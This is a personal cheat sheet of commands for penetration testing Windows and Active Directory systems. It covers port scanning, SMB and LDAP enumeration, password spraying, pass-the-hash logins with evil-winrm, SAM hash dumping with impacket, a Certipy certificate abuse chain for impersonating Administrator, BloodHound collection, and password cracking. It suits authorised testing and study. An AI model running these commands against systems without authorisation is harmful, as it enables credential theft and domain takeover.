#      Windows Penetration Testing process

## Scan avaliable ports on target
```bash
#  nmap
nmap -sC -sV -v --top-ports 1000 <target>
nmap -p- -T5 -v <target> # all ports
nmap -sC -sV -Pn <target> # without ping probes
nmap -sU --top-ports 100 -sC -sV <target>
#  penrec
penrec -t <target> -s 1 -e 50000 -n 400 -o 500 # faster indefining ports without banners
```

## SMB
```bash
smbclient -L //<target>
# better alternative
crackmapexec smb <target> -u '' -p '' --shares # if connected ok of not trying -u 'guest'
crackmapexec smb <target> -u '' -p '' --users  # users in smb
smbclient //<target>/<path>
smbclient //<target>/<path> -U 'guest' # enter
smbclient //<target>/<path> -U '<user>%<pass>'
# smbclient syntax
> get <file> # download to local machine
> file <file> # as in linux
# smbpasswd if password expired se new
smbpasswd -U <target>/<windows_username> -r <target>
# nxc smb
nxc smb <target> -u "Guest" -p "" # same as crackmapexec
nxc smb <target> -u "Guest" -p "" --shares
nxc smb <target> -u "Guest" -p "" --rid-brute
nxc smb <target> -u users.txt -p passwords.txt --continue-on-success
```

## Wine
```bash
wine <file.exe>
-v --verbose
find
user
```
## LDAP
```bash
# if target example.com
ldapsearch -x -H ldap://example.com -D ldap@example.com -w '<bind password(Simple Auth)>' -b 'dc=example,dc=com' -s sub "(sAMAccountName=Administrator)" 
ldapsearch -x -H ldap://example.com -D '<user>@example.com' -W -b 'dc=domain,dc=local' '(objectClass=user)' sAMAccountName
ldapsearch -x -b "dc=example,dc=com" "(objectClass=user)" -H ldap://exemple.com | grep sAMAccountName:
# great tool for ldap research Apache Directory Studio
https://directory.apache.org/studio/
# with user.txt which contains users of target system same with passwords
nxc ldap example.com -u users.txt -p '<pass>'
```

## Evil-WinRm
```bash
evil-winrm -i <target> -u '<user>' -p '<pass>'
evil-winrm  -S -i <target> -k key.pem -c cert.pem -u '<user>' # reverse shell with cert
evil-winrm -i <10.129.87.12> -u '<user>' -H <hash>
```

## Impacket-*
```bash
impacket-changepasswd <target>/'<user>':<user>@<ip_target> -newpass 'hacked' -p <current_pass>

impacket-lookupsid '<target>/guest'@<target> -no-pass # enemuration
impacket-lookupsid '<target>/guest'@<target> -no-pass | grep 'SidTypeUser' | sed 's/.*\\\(.*\) (SidTypeUser)/\1/' > users.txt
# writes to user.txt all users of domain
impacket-secretsdump -sam sam -system system local # dump user NTLM hash
```
## Certipy
```bash
certipy-ad find -u '<user>' -p '<password>' -dc-ip <target_ip> -vulnerable -stdout
certipy-ad req -u '<user>' -p '<password' -dc-ip <target_ip> -ca <certificate> -template <templates> -upn Administrator -debug -target <target_dc> -key-size 4096 -sid <SID>
# returns administrator.pfx hash
certipy-ad auth -pfx 'administrator.pfx' -username 'administrator' -domain '<domain>' -dc-ip <target-ip>
```

## BloodHound && Neo4j
```bash
sudo neo4j start # http://localhost:7474
# if we have a WinRm session
sharphound -h
upload SharpHound.exe # collects info about system
./SharpHound.exe
download <number>_BloodHound.zip 
# if not
bloodhound-python -d <target> -u '<user>' -p '<pass>' -dc '<domain-target>' -c all -ns <ip-target> --output blood
# collects info about system in json files

./BloodHound # run 
# upload *.json file to bloodhound, shows a map with privileges and vectors pf privesc 
```

## Cracking passwords of zip archives cathed from smb or anouther...
```bash
zip2john <file>.zip > zip.john
john zip.john -wordlist:/usr/share/wordlists/rockyou.txt
# or like this
python2 /usr/share/john/pfx2john.py <file>.pfx > pfx.john
john pfx.john -wordlist:/usr/share/wordlists/rockyou.txt
# So google your type of file with password maybe you could crack it 
```

## OpenSSL
```bash
openssl pkcs12 -in <file>.pfx -nocerts -out key.pem -nodes # google .pfx type of file
```


